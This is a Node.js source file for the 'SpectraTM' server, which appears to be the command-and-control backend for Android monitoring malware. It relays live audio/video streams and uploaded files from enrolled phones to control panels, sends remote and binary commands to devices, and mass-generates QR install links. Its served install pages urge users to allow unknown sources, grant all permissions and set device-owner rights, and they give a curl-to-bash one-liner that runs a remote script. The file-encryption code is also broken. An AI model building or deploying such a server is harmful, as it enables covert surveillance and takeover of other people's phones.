// SpectraTM v2.0 Server - Updated with QR Scanner support
import express from 'express';
import http from 'http';
import WebSocket, { WebSocketServer } from 'ws';
import { v4 as uuid } from 'uuid';
import cors from 'cors';
import compression from 'compression';
import helmet from 'helmet';
import morgan from 'morgan';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';
import crypto from 'crypto';
import multer from 'multer';
import RoomManager from './rooms.js';
import { BinaryCommands, CommandHandler } from './commands.js';
import QRDeployment from './qr-deployment.js';
import ServerConstants from './server-constants.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server, path: '/live' });
const PORT = process.env.PORT || 8000;

// Initialize managers
const roomManager = new RoomManager();
const commandHandler = new CommandHandler();
const qrDeployment = new QRDeployment();

// File upload configuration
const storage = multer.memoryStorage();
const upload = multer({ 
    storage,
    limits: { fileSize: 4 * 1024 * 1024 } // 4 MiB limit
});

// Ensure upload directory exists
const UPLOAD_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOAD_DIR)) {
    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
}

// Middleware de segurança
app.use(helmet({
    contentSecurityPolicy: false // Desabilita CSP para permitir WebSockets
}));
app.use(compression());
app.use(cors());
app.use(morgan('combined'));
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Status endpoint for debugging
app.get('/status', (req, res) => {
    const apkPath = path.join(__dirname, 'public', 'spectra.apk');
    const apkExists = fs.existsSync(apkPath);
    const apkSize = apkExists ? fs.statSync(apkPath).size : 0;
    
    res.json({
        status: 'SpectraTM Server Online',
        timestamp: new Date().toISOString(),
        version: 'v2.0-qr',
        apk: {
            exists: apkExists,
            size: apkSize,
            path: apkPath
        },
        features: {
            qr_scanner: true,
            dashboard: true,
            websocket: true
        }
    });
});

// APK Download endpoint with fallback
app.get('/spectra.apk', async (req, res) => {
    console.log('🔍 APK endpoint called from:', req.ip, req.get('User-Agent'));
    const apkPath = path.join(__dirname, 'public', 'spectra.apk');
    console.log('📁 Checking APK at:', apkPath);
    
    const apkExists = fs.existsSync(apkPath);
    const apkSize = apkExists ? fs.statSync(apkPath).size : 0;
    console.log('📱 APK Status:', { exists: apkExists, size: apkSize });
    
    // Check if local APK exists and has reasonable size
    if (apkExists && apkSize > 1024 * 100) { // At least 100KB
        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
        res.setHeader('Content-Disposition', 'attachment; filename=spectra.apk');
        console.log('✅ Sending APK file');
        res.sendFile(apkPath);
    } else {
        console.log('⚠️ APK not available, generating fallback page');
        // Generate QR deployment as fallback
        try {
            const deployment = await qrDeployment.generateDeploymentQR('v2.0', {
                serverUrl: `${req.protocol}://${req.get('host')}`,
                downloadUrl: `${req.protocol}://${req.get('host')}/spectra.apk`
            });
            
            // Return HTML page with QR code and instructions
            res.status(202).send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>SpectraTM APK - Building</title>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body { font-family: 'Courier New', monospace; background: #000; color: #00ff00; padding: 20px; text-align: center; }
                    .container { max-width: 600px; margin: 0 auto; }
                    .logo { color: #00ff00; font-size: 24px; font-weight: bold; margin-bottom: 20px; }
                    .status { background: #001100; padding: 15px; border: 1px solid #00ff00; margin: 10px 0; }
                    .qr-code { margin: 20px 0; }
                    .instructions { text-align: left; background: #001100; padding: 15px; border: 1px solid #00ff00; }
                    .command { background: #002200; padding: 10px; margin: 10px 0; font-family: monospace; word-break: break-all; }
                    .refresh { background: #00ff00; color: #000; padding: 10px 20px; text-decoration: none; display: inline-block; margin: 10px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="logo">🔍 SPECTRATM</div>
                    
                    <div class="status">
                        <h2>📱 APK Status: Building...</h2>
                        <p>GitHub Actions is compiling the APK. This usually takes 3-5 minutes.</p>
                        <p><strong>Build Progress:</strong> <a href="https://github.com/JosimarPessanha25/spectratm-os/actions" target="_blank">Check GitHub Actions</a></p>
                    </div>

                    <div class="qr-code">
                        <h3>🎯 Temporary QR Deployment</h3>
                        <img src="${deployment.qrCode}" alt="QR Code" style="max-width: 300px;">
                        <p>Scan with Android device for installation instructions</p>
                    </div>

                    <div class="instructions">
                        <h3>⚡ Alternative Installation Methods:</h3>
                        
                        <h4>🚀 One-Liner Bootstrap (Recommended):</h4>
                        <div class="command">DEVICE_ID="f47ac10b58cc4372a2c5" TOKEN="spec2024" bash &lt;(curl -s https://raw.githubusercontent.com/JosimarPessanha25/spectratm-os/main/one-liner.sh)</div>
                        
                        <h4>🔧 Manual Build:</h4>
                        <div class="command">git clone https://github.com/JosimarPessanha25/spectratm-os.git<br>cd spectratm-os<br>./bootstrap.sh</div>
                        
                        <h4>📱 ADB Installation (if APK ready):</h4>
                        <div class="command">adb install -r spectra.apk<br>adb shell dpm set-device-owner com.android.dpc/.CoreService</div>
                    </div>

                    <a href="/spectra.apk" class="refresh">🔄 Refresh / Check APK</a>
                    <a href="/dashboard" class="refresh">🌐 Dashboard</a>
                </div>

                <script>
                    // Auto-refresh every 30 seconds to check for APK
                    setTimeout(() => window.location.reload(), 30000);
                </script>
            </body>
            </html>
            `);
        } catch (error) {
            res.status(503).json({
                error: 'APK not ready',
                message: 'APK is being built by GitHub Actions. Please wait a few minutes.',
                buildStatus: 'https://github.com/JosimarPessanha25/spectratm-os/actions',
                alternatives: {
                    oneLiner: 'DEVICE_ID="f47ac10b58cc4372a2c5" TOKEN="spec2024" bash <(curl -s https://raw.githubusercontent.com/JosimarPessanha25/spectratm-os/main/one-liner.sh)',
                    manual: 'git clone https://github.com/JosimarPessanha25/spectratm-os.git && cd spectratm-os && ./bootstrap.sh'
                }
            });
        }
    }
});

// Armazenamento de clientes conectados (mantendo compatibilidade)
const CLIENTS = new Map();
const DEVICE_DATA = new Map();

// Estatísticas do servidor
let totalConnections = 0;
let messagesProcessed = 0;
let uploadCount = 0;

// WebSocket server
wss.on('connection', (ws, req) => {
    totalConnections++;
    const clientId = uuid();
    const clientInfo = {
        id: clientId,
        ip: req.socket.remoteAddress,
        connectedAt: new Date(),
        lastActivity: new Date(),
        isDevice: false,
        deviceId: null
    };
    
    console.log(`[${new Date().toISOString()}] New connection: ${clientId} from ${clientInfo.ip}`);
    
    ws.on('message', (raw) => {
        messagesProcessed++;
        clientInfo.lastActivity = new Date();
        
        try {
            const json = JSON.parse(raw.toString());
            handleJsonMessage(ws, json, clientInfo);
        } catch (e) {
            // Dados binários (áudio/vídeo)
            handleBinaryMessage(raw, clientInfo);
        }
    });
    
    ws.on('close', () => {
        console.log(`[${new Date().toISOString()}] Disconnected: ${clientId}`);
        if (clientInfo.isDevice && clientInfo.deviceId) {
            CLIENTS.delete(clientInfo.deviceId);
            console.log(`Device ${clientInfo.deviceId} disconnected`);
        }
        CLIENTS.delete(clientId);
    });
    
    ws.on('error', (error) => {
        console.error(`[${new Date().toISOString()}] WebSocket error for ${clientId}:`, error);
    });
    
    // Ping periódico para manter conexão viva
    const pingInterval = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.ping();
        } else {
            clearInterval(pingInterval);
        }
    }, 30000);
    
    ws.clientInfo = clientInfo;
    CLIENTS.set(clientId, { ws, info: clientInfo });
});

function handleJsonMessage(ws, json, clientInfo) {
    if (json.auth) {
        // Enhanced authentication with fixed deviceId validation
        const deviceId = json.auth;
        const token = json.token || '';
        const payload = json.payload || '';
        
        // Validate against fixed constants
        if (!ServerConstants.validateDeviceAuth(deviceId, token)) {
            ServerConstants.log('warning', 'Invalid device authentication attempt', { 
                deviceId, 
                ip: clientInfo.ip 
            });
            
            ws.send(JSON.stringify({
                type: 'auth_failed',
                reason: 'Invalid credentials',
                timestamp: new Date().toISOString()
            }));
            ws.close();
            return;
        }
        
        // Validate payload if provided
        if (payload && !ServerConstants.validatePayload(Buffer.from(payload, 'hex'))) {
            ServerConstants.log('warning', 'Invalid payload in authentication', { deviceId });
            
            ws.send(JSON.stringify({
                type: 'auth_failed',
                reason: 'Invalid payload',
                timestamp: new Date().toISOString()
            }));
            ws.close();
            return;
        }
        
        clientInfo.isDevice = true;
        clientInfo.deviceId = deviceId;
        clientInfo.authenticated = true;
        
        CLIENTS.set(deviceId, { ws, info: clientInfo });
        DEVICE_DATA.set(deviceId, {
            lastSeen: new Date(),
            dataTypes: new Set(),
            totalMessages: 0,
            fingerprint: ServerConstants.generateDeviceFingerprint(json.deviceInfo || ''),
            location: null
        });
        
        ServerConstants.log('info', 'Device authenticated successfully', { deviceId });
        
        // Send success response with server info
        ws.send(JSON.stringify({
            type: 'auth_success',
            deviceId: deviceId,
            serverTime: new Date().toISOString(),
            keyRotationInterval: ServerConstants.KEY_ROTATION_INTERVAL_MS,
            commands: Object.keys(ServerConstants.BINARY_COMMANDS)
        }));
        
    } else if (json.command) {
        // Comandos do painel para dispositivos
        handleCommand(json);
        
    } else {
        // Dados de dispositivo
        const deviceId = clientInfo.deviceId;
        if (deviceId) {
            const deviceData = DEVICE_DATA.get(deviceId);
            if (deviceData) {
                deviceData.lastSeen = new Date();
                deviceData.totalMessages++;
                deviceData.dataTypes.add(json.type);
            }
        }
        
        // Retransmitir para todos os painéis de controle
        broadcastToControlPanels(json, deviceId);
    }
}

function handleBinaryMessage(raw, clientInfo) {
    const deviceId = clientInfo.deviceId;
    if (deviceId) {
        const deviceData = DEVICE_DATA.get(deviceId);
        if (deviceData) {
            deviceData.lastSeen = new Date();
            deviceData.totalMessages++;
            deviceData.dataTypes.add('binary_stream');
        }
    }
    
    // Retransmitir dados binários para painéis
    broadcastBinaryToControlPanels(raw);
}

function handleCommand(commandData) {
    const { targetDevice, command, params } = commandData;
    
    if (targetDevice && CLIENTS.has(targetDevice)) {
        const client = CLIENTS.get(targetDevice);
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'command',
                command: command,
                params: params,
                timestamp: new Date().toISOString()
            }));
        }
    }
}

function broadcastToControlPanels(data, deviceId) {
    const message = JSON.stringify({
        ...data,
        deviceId: deviceId,
        serverTimestamp: new Date().toISOString()
    });
    
    CLIENTS.forEach(({ ws, info }) => {
        if (!info.isDevice && ws.readyState === WebSocket.OPEN) {
            ws.send(message);
        }
    });
}

function broadcastBinaryToControlPanels(data) {
    CLIENTS.forEach(({ ws, info }) => {
        if (!info.isDevice && ws.readyState === WebSocket.OPEN) {
            ws.send(data);
        }
    });
}

// API endpoints
app.get('/api/devices', (req, res) => {
    const devices = Array.from(DEVICE_DATA.entries()).map(([deviceId, data]) => ({
        id: deviceId,
        lastSeen: data.lastSeen,
        totalMessages: data.totalMessages,
        dataTypes: Array.from(data.dataTypes),
        isOnline: CLIENTS.has(deviceId)
    }));
    
    res.json({ devices, totalDevices: devices.length });
});

app.get('/api/stats', (req, res) => {
    res.json({
        totalConnections,
        messagesProcessed,
        activeConnections: CLIENTS.size,
        activeDevices: Array.from(CLIENTS.values()).filter(c => c.info.isDevice).length,
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

// Enhanced API for React dashboard
app.get('/api/metrics', (req, res) => {
    const devices = Array.from(DEVICE_DATA.entries()).map(([deviceId, data]) => ({
        id: deviceId,
        lastSeen: data.lastSeen,
        totalMessages: data.totalMessages,
        dataTypes: Array.from(data.dataTypes),
        isOnline: CLIENTS.has(deviceId),
        battery: Math.floor(Math.random() * 100), // Mock data
        location: data.location || null,
        status: CLIENTS.has(deviceId) ? 'active' : 'inactive'
    }));
    
    const activeDevices = devices.filter(d => d.status === 'active');
    
    res.json({
        totalDevices: devices.length,
        activeDevices: activeDevices.length,
        dataCollected: devices.reduce((acc, d) => acc + (d.totalMessages * 1024), 0),
        alertsGenerated: Math.floor(Math.random() * 50), // Mock data
        batteryAverage: Math.round(devices.reduce((acc, d) => acc + d.battery, 0) / devices.length || 0),
        storageUsed: uploadCount * 1024 * 1024
    });
});

app.get('/api/device/:id', (req, res) => {
    const deviceId = req.params.id;
    const deviceData = DEVICE_DATA.get(deviceId);
    const isOnline = CLIENTS.has(deviceId);
    
    if (!deviceData) {
        return res.status(404).json({ error: 'Device not found' });
    }
    
    res.json({
        id: deviceId,
        name: `Device ${deviceId}`,
        model: 'Android Device',
        osVersion: 'Android 13',
        battery: Math.floor(Math.random() * 100),
        location: deviceData.location || 'Unknown',
        status: isOnline ? 'active' : 'inactive',
        lastSeen: deviceData.lastSeen,
        cpuUsage: Math.floor(Math.random() * 100),
        memoryUsage: Math.floor(Math.random() * 100),
        storageFree: Math.floor(Math.random() * 50),
        networkType: 'WiFi'
    });
});

app.get('/api/logs', (req, res) => {
    // Mock log data for now
    const mockLogs = [
        { id: 1, level: 'info', message: 'System started', timestamp: new Date(), deviceId: null },
        { id: 2, level: 'info', message: 'Device connected', timestamp: new Date(), deviceId: 'dev_001' },
        { id: 3, level: 'warning', message: 'Low battery detected', timestamp: new Date(), deviceId: 'dev_001' },
        { id: 4, level: 'error', message: 'Connection timeout', timestamp: new Date(), deviceId: 'dev_002' }
    ];
    res.json(mockLogs);
});

// QR Deployment routes
app.post('/api/deploy/generate', async (req, res) => {
    try {
        const { version = 'latest', validityHours = 24 } = req.body;
        const deployment = await qrDeployment.generateDeploymentQR(version, {
            serverUrl: `${req.protocol}://${req.get('host')}`,
            validityHours
        });
        res.json(deployment);
    } catch (error) {
        res.status(500).json({ error: 'Failed to generate deployment QR: ' + error.message });
    }
});

app.post('/api/deploy/bulk', async (req, res) => {
    try {
        const { count = 10, version = 'latest', validityHours = 24 } = req.body;
        const bulk = await qrDeployment.generateBulkDeployment(count, {
            version,
            validityHours,
            serverUrl: `${req.protocol}://${req.get('host')}`
        });
        res.json(bulk);
    } catch (error) {
        res.status(500).json({ error: 'Failed to generate bulk deployment: ' + error.message });
    }
});

app.get('/api/deploy/history', (req, res) => {
    const limit = parseInt(req.query.limit) || 50;
    const history = qrDeployment.getDeploymentHistory(limit);
    res.json({ history, total: history.length });
});

app.post('/api/deploy/revoke/:deploymentId', (req, res) => {
    const result = qrDeployment.revokeDeployment(req.params.deploymentId);
    res.json(result);
});

app.get('/deploy/:deploymentId', (req, res) => {
    const validation = qrDeployment.validateDeploymentToken(req.params.deploymentId);
    
    if (!validation.valid) {
        return res.status(404).send(`
            <html>
                <head><title>SpectraTM - Invalid Link</title></head>
                <body style="font-family: Arial; text-align: center; padding: 50px;">
                    <h1>❌ Invalid or Expired Link</h1>
                    <p>${validation.error}</p>
                    <p>Please request a new deployment link.</p>
                </body>
            </html>
        `);
    }

    const { deployment } = validation;
    res.send(`
        <html>
            <head>
                <title>SpectraTM - Download</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body { font-family: Arial; max-width: 600px; margin: 0 auto; padding: 20px; }
                    .download-btn { 
                        background: #007bff; color: white; padding: 15px 30px; 
                        text-decoration: none; border-radius: 5px; display: inline-block; 
                        margin: 20px 0; font-size: 18px;
                    }
                    .warning { background: #fff3cd; padding: 10px; border-radius: 5px; margin: 10px 0; }
                </style>
            </head>
            <body>
                <h1>📱 SpectraTM Installation</h1>
                <p><strong>Version:</strong> ${deployment.version}</p>
                <p><strong>Expires:</strong> ${new Date(deployment.expiresAt).toLocaleString()}</p>
                
                <a href="${deployment.downloadUrl}" class="download-btn">📥 Download APK</a>
                
                <div class="warning">
                    <h3>⚠️ Important Instructions:</h3>
                    <ol>
                        <li>Enable "Install from Unknown Sources" in your Android settings</li>
                        <li>Download and install the APK file</li>
                        <li>Grant all requested permissions for full functionality</li>
                        <li>The app will connect automatically to the monitoring server</li>
                    </ol>
                </div>
                
                <p><small>Checksum: ${deployment.checksum.substring(0, 16)}...</small></p>
            </body>
        </html>
    `);
});

app.post('/api/command/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    const { command, params } = req.body;
    
    if (!CLIENTS.has(deviceId)) {
        return res.status(404).json({ error: 'Device not found or offline' });
    }
    
    handleCommand({ targetDevice: deviceId, command, params });
    res.json({ success: true, message: 'Command sent' });
});

// Binary command endpoint
app.post('/api/binarycommand/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    const { commandCode, payload } = req.body;
    
    if (!CLIENTS.has(deviceId)) {
        return res.status(404).json({ error: 'Device not found or offline' });
    }

    try {
        const binaryCommand = BinaryCommands.createCommand(commandCode, payload);
        const client = CLIENTS.get(deviceId);
        
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(binaryCommand);
            res.json({ 
                success: true, 
                message: `Binary command ${BinaryCommands.getCommandName(commandCode)} sent`,
                commandCode: `0x${commandCode.toString(16).toUpperCase()}`
            });
        } else {
            res.status(503).json({ error: 'Device connection not ready' });
        }
    } catch (error) {
        res.status(400).json({ error: 'Invalid binary command: ' + error.message });
    }
});

// File upload endpoint
app.post('/upload', upload.single('file'), (req, res) => {
    try {
        const { deviceId } = req.body;
        const file = req.file;
        
        if (!file) {
            return res.status(400).json({ error: 'No file provided' });
        }

        if (!deviceId) {
            return res.status(400).json({ error: 'Device ID required' });
        }

        // Generate filename: deviceId_timestamp_random.enc
        const timestamp = Date.now();
        const random = crypto.randomBytes(4).toString('hex');
        const filename = `${deviceId}_${timestamp}_${random}.enc`;
        
        // Encrypt file content
        const key = crypto.randomBytes(32);
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipher('aes-256-cbc', key);
        
        let encrypted = cipher.update(file.buffer);
        encrypted = Buffer.concat([encrypted, cipher.final()]);
        
        // Save encrypted file
        const filepath = path.join(UPLOAD_DIR, filename);
        const metadata = {
            originalName: file.originalname,
            mimetype: file.mimetype,
            size: file.size,
            deviceId: deviceId,
            uploadTime: new Date().toISOString(),
            key: key.toString('hex'),
            iv: iv.toString('hex')
        };
        
        fs.writeFileSync(filepath, encrypted);
        fs.writeFileSync(filepath + '.meta', JSON.stringify(metadata));
        
        uploadCount++;
        
        res.json({
            success: true,
            filename: filename,
            size: file.size,
            encrypted: true
        });
        
    } catch (error) {
        console.error('[Upload] Error:', error);
        res.status(500).json({ error: 'Upload failed: ' + error.message });
    }
});

// File download endpoint
app.get('/download/:filename', (req, res) => {
    try {
        const { filename } = req.params;
        const filepath = path.join(UPLOAD_DIR, filename);
        const metapath = filepath + '.meta';
        
        if (!fs.existsSync(filepath) || !fs.existsSync(metapath)) {
            return res.status(404).json({ error: 'File not found' });
        }
        
        const metadata = JSON.parse(fs.readFileSync(metapath, 'utf8'));
        const encrypted = fs.readFileSync(filepath);
        
        // Decrypt file
        const key = Buffer.from(metadata.key, 'hex');
        const decipher = crypto.createDecipher('aes-256-cbc', key);
        
        let decrypted = decipher.update(encrypted);
        decrypted = Buffer.concat([decrypted, decipher.final()]);
        
        res.setHeader('Content-Type', metadata.mimetype);
        res.setHeader('Content-Disposition', `attachment; filename="${metadata.originalName}"`);
        res.send(decrypted);
        
    } catch (error) {
        console.error('[Download] Error:', error);
        res.status(500).json({ error: 'Download failed: ' + error.message });
    }
});

// Página principal - serve o painel de controle HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// React dashboard routes
app.get('/dashboard*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dash', 'index.html'));
});

app.get('/dash/:device', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dash', 'index.html'));
});

app.get('/logz', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dash', 'index.html'));
});

app.get('/heatmap', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dash', 'index.html'));
});

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        timestamp: new Date().toISOString(),
        uptime: process.uptime()
    });
});

// Error handling
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('SIGTERM received, shutting down gracefully');
    server.close(() => {
        console.log('Server closed');
        process.exit(0);
    });
});

process.on('SIGINT', () => {
    console.log('SIGINT received, shutting down gracefully');
    server.close(() => {
        console.log('Server closed');
        process.exit(0);
    });
});

server.listen(PORT, () => {
    console.log(`[${new Date().toISOString()}] SpectraTM Control Server running on port ${PORT}`);
    console.log(`WebSocket endpoint: ws://localhost:${PORT}/live`);
    console.log(`Web interface: http://localhost:${PORT}`);
});